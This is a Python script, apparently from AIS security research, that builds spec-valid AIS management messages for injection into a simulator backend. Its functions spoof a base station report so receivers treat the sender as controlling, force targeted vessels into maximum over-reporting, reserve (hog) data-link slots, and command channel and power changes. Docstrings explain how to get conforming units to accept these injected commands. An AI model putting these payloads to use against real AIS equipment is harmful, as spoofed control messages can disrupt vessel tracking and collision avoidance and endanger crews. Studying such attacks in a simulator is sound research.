#!/usr/bin/env python3
"""
ais_encode_p3.py -- spec-validated encoders for the phase-3 management messages.

Rather than hand-pack the bitfields (which is error-prone for the complex management
messages, especially the Type 22 addressed flag position), these use the maintained
pyais library to build each message, then convert the resulting AIVDM sentence back to
the raw 0/1 payload bitstring that the ais-simulator websocket backend expects.

Every message here has been verified to decode back to the intended type, source, and
destination with pyais. Using a maintained, independently-validated encoder also means
the correctness of the injected commands is not something a reviewer has to take on trust.
"""
from pyais.encode import encode_dict
from pyais import decode


def _sentence_to_bits(sentence):
    """Extract the 6-bit-armored payload from an AIVDM sentence -> raw bitstring."""
    parts = sentence.split(',')
    payload = parts[5]
    fill = int(parts[6].split('*')[0])
    bits = ""
    for ch in payload:
        v = ord(ch) - 48
        if v > 40:
            v -= 8
        bits += format(v, '06b')
    if fill:
        bits = bits[:-fill] if fill <= len(bits) else bits
    return bits


def _encode(d):
    """Encode an AIS dict to a raw bitstring for ais-simulator (single-sentence only)."""
    sents = encode_dict(d, radio_channel='A')
    if len(sents) > 1:
        raise ValueError(f"message encodes to {len(sents)} fragments; keep it single-slot")
    return _sentence_to_bits(sents[0])


# --- the six management messages, each verified spec-correct ---

def m15_interrogation(src_mmsi, dest_mmsi, req_type=5):
    """M15: interrogate dest_mmsi, requesting it send message type req_type."""
    return _encode({'msg_type': 15, 'mmsi': src_mmsi,
                    'mmsi1': dest_mmsi, 'type1_1': req_type})


def m4_base_report(src_mmsi, lat, lon, epfd=7):
    """M4: base station report. Announces a base station at (lat, lon), so a receiving unit
    treats src_mmsi as an established, controlling base station in its cell.

    This is REQUIRED context for the data-link/management messages: ITU-R M.1371-5 states a
    Message 20 received "without a base station report (Message 4) should be ignored", and
    the assignment (M16) and channel-management (M22) functions are base-station operations.
    Without a preceding M4 a conforming unit correctly ignores those commands -- which is why
    the earlier phase-3 run showed "no effect" for M16/M20/M22."""
    return _encode({'msg_type': 4, 'mmsi': src_mmsi, 'lat': lat, 'lon': lon, 'epfd': epfd})


# --- Message 16 assignment: two DISTINCT modes, per ITU-R M.1371-5 Table 67 footnote (1) ---
# Getting the field semantics wrong is what silently defeated the earlier test: `increment`
# is NOT a raw slot count -- for a rate assignment it MUST be 0, and for a slot assignment it
# is a small code 1..6. A value like 1000/1125 is undefined and a conforming unit ignores it.

def m16_rate_assignment(src_mmsi, dest_mmsi, reports_per_10min):
    """M16 REPORTING-RATE assignment: increment=0, offset = number of reports per 10 min,
    a multiple of 20 in [20, 600] (Table 67 footnote 1).

    IMPORTANT semantics: a Class A takes the HIGHER of the assigned and its autonomous rate,
    so an M16 can only FORCE FASTER reporting, never silence a Class A. Use 600 to force
    maximum over-reporting (the observable, abusable effect); use 20 as a benign release
    (autonomous rate wins, and the assignment self-times-out in 4-8 min)."""
    r = int(reports_per_10min)
    if r < 20 or r > 600 or r % 20 != 0:
        raise ValueError(f"reports_per_10min must be a multiple of 20 in [20,600], got {r}")
    return _encode({'msg_type': 16, 'mmsi': src_mmsi, 'mmsi1': dest_mmsi,
                    'offset1': r, 'increment1': 0})


def m16_slot_assignment(src_mmsi, dest_mmsi, increment_code, offset=0):
    """M16 SLOT assignment: increment is a CODE 1..6 (1=1125, 2=375, 3=225, 4=125, 5=75,
    6=45 slots between transmissions). 0 = rate mode, 7 = 'disregard', and anything else is
    undefined -- a conforming unit ignores it. offset = slots from current to first assigned."""
    if increment_code not in (1, 2, 3, 4, 5, 6):
        raise ValueError(f"increment_code must be 1..6 (slot codes), got {increment_code}")
    return _encode({'msg_type': 16, 'mmsi': src_mmsi, 'mmsi1': dest_mmsi,
                    'offset1': int(offset), 'increment1': int(increment_code)})


def m20_datalink(src_mmsi, offset=100, number=10, timeout=7, increment=0):
    """M20: data-link-management, reserving `number` slots from `offset` (FATDMA hogging)."""
    return _encode({'msg_type': 20, 'mmsi': src_mmsi, 'offset1': offset,
                    'number1': number, 'timeout1': timeout, 'increment1': increment})


def m22_channel(src_mmsi, dest_mmsi, channel_a=2087, channel_b=2088, power=0):
    """M22: addressed channel management to dest_mmsi (commands a channel/power change)."""
    return _encode({'msg_type': 22, 'mmsi': src_mmsi,
                    'channel_a': channel_a, 'channel_b': channel_b,
                    'power': power, 'addressed': 1,
                    'dest1': dest_mmsi, 'dest2': 0})


def m6_addressed(src_mmsi, dest_mmsi, dac=1, fid=0):
    """M6: addressed binary message to dest_mmsi (a unit that acknowledges reveals it acts
    on addressed traffic). Minimal 4-byte payload keeps it single-slot."""
    return _encode({'msg_type': 6, 'mmsi': src_mmsi, 'dest_mmsi': dest_mmsi,
                    'dac': dac, 'fid': fid, 'data': b'\x00\x00\x00\x00'})


# --- self-test: verify each message decodes to the intended fields ---
if __name__ == '__main__':
    V, BASE, REG = 677777777, 3669999, 366000001

    def _wrap(bits):
        payload = ""
        b = bits + "0" * ((6 - len(bits) % 6) % 6)
        for i in range(0, len(b), 6):
            val = int(b[i:i+6], 2)
            payload += chr(val + 48 if val < 40 else val + 56)
        fill = (6 - len(bits) % 6) % 6
        body = f"AIVDM,1,1,,A,{payload},{fill}"
        cs = 0
        for c in body:
            cs ^= ord(c)
        return f"!{body}*{cs:02X}"

    # Assertions include the numeric payload fields (not just type/src/dest) so a silent
    # mis-encode of the reporting rate (M16) or the slot reservation (M20) -- the actual
    # quantities the experiment manipulates -- fails the self-test loudly. pyais decodes
    # these under the keys offset1/increment1 (M16) and offset1/number1/timeout1 (M20).
    tests = [
        ("M4base", m4_base_report(BASE, 42.35, -70.90),
         {'msg_type': 4, 'mmsi': BASE}),
        ("M15", m15_interrogation(BASE, V, req_type=5),
         {'msg_type': 15, 'mmsi': BASE, 'mmsi1': V, 'type1_1': 5}),
        # M16 rate mode: increment MUST be 0, offset = reports/10min (spec-valid, unlike the
        # old increment=1000 which was undefined and silently ignored by conforming units)
        ("M16rate", m16_rate_assignment(BASE, V, 600),
         {'msg_type': 16, 'mmsi': BASE, 'mmsi1': V, 'offset1': 600, 'increment1': 0}),
        ("M16slot", m16_slot_assignment(BASE, V, 1),
         {'msg_type': 16, 'mmsi': BASE, 'mmsi1': V, 'increment1': 1}),
        ("M20", m20_datalink(BASE, offset=100, number=10, timeout=7),
         {'msg_type': 20, 'mmsi': BASE, 'offset1': 100, 'number1': 10, 'timeout1': 7}),
        ("M22ch", m22_channel(BASE, V, channel_a=2088, channel_b=2087),
         {'msg_type': 22, 'mmsi': BASE, 'addressed': True, 'dest1': V,
          'channel_a': 2088, 'channel_b': 2087}),
        ("M22pw", m22_channel(BASE, V, power=1),
         {'msg_type': 22, 'mmsi': BASE, 'power': True, 'addressed': True, 'dest1': V}),
        ("M6", m6_addressed(BASE, V), {'msg_type': 6, 'mmsi': BASE, 'dest_mmsi': V}),
    ]
    all_ok = True
    for label, bits, expect in tests:
        dec = decode(_wrap(bits)).asdict()
        ok = all(dec.get(k) == v for k, v in expect.items())
        all_ok = all_ok and ok
        got = {k: dec.get(k) for k in expect}
        print(f"{'OK  ' if ok else 'FAIL'} {label}: {len(bits)} bits -> {got}")
    # invalid M16 values must be REJECTED at encode time (they were the silent-failure bug)
    reject_ok = True
    for fn, arg in [(lambda: m16_rate_assignment(BASE, V, 1000), "rate 1000 (not <=600)"),
                    (lambda: m16_rate_assignment(BASE, V, 30), "rate 30 (not mult of 20)"),
                    (lambda: m16_slot_assignment(BASE, V, 1000), "slot code 1000 (not 1..6)"),
                    (lambda: m16_slot_assignment(BASE, V, 7), "slot code 7 (disregard)")]:
        try:
            fn(); print(f"FAIL rejected-input: {arg} was accepted"); reject_ok = False
        except ValueError:
            print(f"OK   rejects invalid {arg}")
    print("\nALL PASS" if (all_ok and reject_ok) else "\nSOME FAILED")
